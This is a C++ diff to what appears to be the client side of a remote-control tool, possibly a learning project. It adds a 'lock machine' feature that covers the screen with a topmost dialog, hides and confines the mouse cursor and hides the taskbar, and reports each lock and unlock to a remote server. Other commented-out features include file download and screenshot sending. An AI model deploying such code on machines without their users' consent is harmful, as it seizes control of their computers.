@@ -8,6 +8,7 @@
 #include <direct.h>
 #include <io.h>
 #include <atlimage.h>
+#include "lockdialog.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -222,6 +223,63 @@ int sendscreen()
 	return 0;
 }
 
+clockdialog dlg;
+uint threadid;
+
+unsigned __stdcall threadlockdialog(void* arg)
+{
+	dlg.Create(IDD_DIALOG_INFO, NULL);
+	dlg.ShowWindow(SW_SHOW);
+	//遮蔽后台窗口
+	CRect rect;
+	rect.left = 0, rect.top = 0;
+	//rect.right = GetSystemMetrics(SM_CXFULLSCREEN);
+	//rect.bottom = GetSystemMetrics(SM_CYFULLSCREEN) * 1.1;
+	//dlg.MoveWindow(rect);
+	// 窗口置顶
+	dlg.SetWindowPos(&dlg.wndTopMost, 0, 0, 0, 0, SWP_NOSIZE | SWP_NOMOVE);
+	// 限制鼠标功能和移动范围
+	ShowCursor(0);
+	rect.right = rect.left + 1;
+	rect.bottom = rect.top + 1;
+	ClipCursor(rect);
+	//隐藏任务栏
+	::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_HIDE);
+
+	MSG msg;
+	while (GetMessage(&msg, NULL, 0, 0))
+	{
+		TranslateMessage(&msg);
+		DispatchMessage(&msg);
+		if (msg.message == WM_KEYDOWN)
+		{
+			cout << msg.message << ' ' << msg.wParam << ' ' << msg.lParam << endl;
+			printf("0X%X 0X%X\n", msg.wParam, msg.lParam);
+
+			if (msg.wParam == 0X1B) break;
+		}
+	}
+	ShowCursor(1);
+	::ShowWindow(::FindWindow(_T("Shell_TrayWnd"), NULL), SW_SHOW);
+	dlg.DestroyWindow();
+	_endthreadex(0);
+	return 0;
+}
+
+int lockmachine()
+{
+	if (dlg.m_hWnd == 0 || dlg.m_hWnd == INVALID_HANDLE_VALUE) _beginthreadex(0, 0, threadlockdialog, 0, 0, &threadid);
+
+	pserver->sendate(cpacket(7, 0, 0));
+	return 0;
+}
+
+int unlockmachine()
+{
+	PostThreadMessage(threadid, WM_KEYDOWN, 0X1B, 0X10001);
+	pserver->sendate(cpacket(8, 0, 0));
+	return 0;
+}
 
 int main()
 {
@@ -240,6 +298,7 @@ int main()
 		}
 		else
 		{
+
 			/*int cnt = 0;
 			csocket* pserver = csocket::getsocket();
 			if (pserver->init() == 0)
@@ -265,12 +324,19 @@ int main()
 
 				
 			}*/
+
+			
+
 			//makedriverinfo(); // 查看磁盘分区
 			//makedirectoryinfo(); // 查看指定目录下的文件
 			//runfile(); // 打开文件
 			//downloadfile(); // 下载文件
 			//mousevent(); // 鼠标事件
-			sendscreen();
+			//sendscreen(); // 发送屏幕截图
+			lockmachine(); // 锁机
+			//unlockmachine(); // 解锁
+			Sleep(1000);
+			unlockmachine();
 		}
 	}
 	else
@@ -280,11 +346,10 @@ int main()
 		nRetCode = 1;
 	}
 
-
-
 	while (1)
 	{
-
+		cout << dlg.m_hWnd << endl;
+		Sleep(1000);
 	}
 	return nRetCode;
 }
